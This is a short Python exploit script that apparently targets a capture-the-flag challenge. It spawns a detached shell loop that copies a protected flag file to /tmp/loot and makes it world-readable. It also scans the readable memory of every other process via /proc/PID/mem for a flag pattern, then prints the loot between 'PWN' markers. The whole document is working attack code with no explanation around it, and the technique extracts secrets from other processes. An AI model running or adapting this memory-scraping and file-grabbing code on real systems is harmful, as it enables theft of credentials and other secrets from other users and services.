import sys, os, re, glob, subprocess
out=[]
# Backup: detached reader that grabs the flag after the handler restores /.txt.galf
subprocess.Popen("for i in 1 2 3 4 5 6; do [ -s /.txt.galf ] && cp /.txt.galf /tmp/loot && chmod 666 /tmp/loot && break; sleep 1; done",
                 shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                 stdin=subprocess.DEVNULL, start_new_session=True)
# Primary: scan every other process's memory for the flag held in RAM
pat=re.compile(rb'MPTC\{[^}\n]{0,120}\}')
me=str(os.getpid())
found=set()
for mp in glob.glob('/proc/[0-9]*/maps'):
    pid=mp.split('/')[2]
    if pid==me: continue
    try: mem=open('/proc/%s/mem'%pid,'rb',0)
    except Exception: continue
    try:
        for line in open(mp):
            p=line.split()
            if len(p)<2 or not p[1].startswith('r'): continue
            try: a,b=[int(x,16) for x in p[0].split('-')]
            except Exception: continue
            if b-a>80_000_000: continue
            try:
                mem.seek(a); data=mem.read(b-a)
            except Exception: continue
            for m in pat.finditer(data):
                found.add(m.group().decode('latin1'))
    except Exception: pass
    finally:
        try: mem.close()
        except Exception: pass
out.append("MEMFOUND: "+repr(sorted(found)))
out.append("LOOT: "+(open('/tmp/loot').read() if os.path.exists('/tmp/loot') else '(empty)'))
sys.stderr.write("\n=====PWN_START=====\n"+"\n".join(out)+"\n=====PWN_END=====\n")
sys.stderr.flush()
raise SystemExit("done")
